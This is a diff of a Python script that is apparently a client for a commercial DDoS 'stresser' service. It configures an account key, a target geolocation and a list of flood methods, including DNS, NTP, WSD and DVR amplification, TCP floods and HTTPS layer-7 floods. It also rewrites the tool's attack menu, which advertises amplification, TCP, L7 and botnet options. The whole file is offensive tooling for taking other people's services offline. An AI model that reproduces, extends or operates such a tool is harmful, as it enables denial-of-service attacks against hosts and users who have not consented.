@@ -10,14 +10,14 @@ _USERNAME="larina"
 _KEY="KEY_HERE" # key from here >> https://stresser.us/
 
 # https://stresser.us/documentation
-_GEO="ALL" # geolocation for tcp tfo
+_GEO="TH" # geolocation for tcp tfo
 _SUBNET="true" # subnet mode for amp method
 _DALAY=0.5 # wait delay per req
-_METHODS=["SSDP", "SNMP", "MIX", "ARD", "DVR", "WSD", "DNS", "UDPRAW", "UDPPPS", "TCPLEGIT", "TCPSYN", "TCPACK", "TCPTFO", "TCPAMP", "IPRAND", "FIVEM", "VALVE", "OVHAMP", "HTTPSV1", "HTTPSV2"]
+_METHODS=["DNS","NTP","WSD","DVR","ARD", "TCPMB" ,"HTTPSv3","HTTPSv2","HTTPSv1"]
 _MACRO={ # full power
-    "MAXTCP":["tcptfo", "tcplegit", "tcpamp", "valve"],
-    "MAXUDP":["mix", "dns", "ard", "udppps"],
-    "MAXHTTPS":["HTTPSv1", "HTTPSv2"]
+    "MAXTCP":["TCPMB"],
+    "MAXUDP":["DNS", "NTP", "WSD", "DVR", "ARD"],
+    "MAXHTTPS":["HTTPSv1", "HTTPSv2", "HTTPSv3"]
 }
 
 __builtins__.print = lambda text="",end="\r\n": stdout.write(f"{text}{end}");stdout.flush()
@@ -78,13 +78,13 @@ def request(ip,port,time,conn,method):
 def helpcom():
     logo()
     # \t\t {makec("║",_COLOR.line)} {makec("BOTNET",206)}  ║ {makec("> TCPBOT, SYNBOT, UDPBOT, UDPSBOT, OVHBOT",_COLOR.text)}        {makec("║",_COLOR.line)}
+    # \t\t {makec("║",_COLOR.line)} {makec("L3",203)}      ║ {makec("> IPRAND",_COLOR.text)}                                         {makec("║",_COLOR.line)}
+    # \t\t {makec("║",_COLOR.line)} {makec("UDP",197)}     ║ {makec("> UDPRAW, UDPPPS",_COLOR.text)}                                 {makec("║",_COLOR.line)}
+    # \t\t {makec("║",_COLOR.line)} {makec("SPECIAL",135)} ║ {makec("> VALVE, FIVEM, OVHAMP",_COLOR.text)}     
     printc(f"""\t\t {makec("╔═════════╦══════════════════════════════════════════════════╗",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("AMP",211)}     ║ {makec("> SSDP, SNMP, MIX, ARD, DVR, WSD, DNS",_COLOR.text)}            {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("TCP",206)}     ║ {makec("> TCPLEGIT, TCPSYN, TCPACK, TCPTFO, TCPAMP",_COLOR.text)}       {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("UDP",197)}     ║ {makec("> UDPRAW, UDPPPS",_COLOR.text)}                                 {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("L7",201)}      ║ {makec("> HTTPSv1, HTTPSv2",_COLOR.text)}                               {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("L3",203)}      ║ {makec("> IPRAND",_COLOR.text)}                                         {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("SPECIAL",135)} ║ {makec("> VALVE, FIVEM, OVHAMP",_COLOR.text)}                           {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("AMP",211)}     ║ {makec("> DNS, NTP, WSD, DVR, ARD",_COLOR.text)}                        {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("TCP",206)}     ║ {makec("> TCPMB",_COLOR.text)}                                          {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("L7",201)}      ║ {makec("> HTTPSv1, HTTPSv2, HTTPSv3",_COLOR.text)}                      {makec("║",_COLOR.line)}
 \t\t {makec("╚═════════╩══════════════════════════════════════════════════╝",_COLOR.line)}""")
 
 def clearcom():
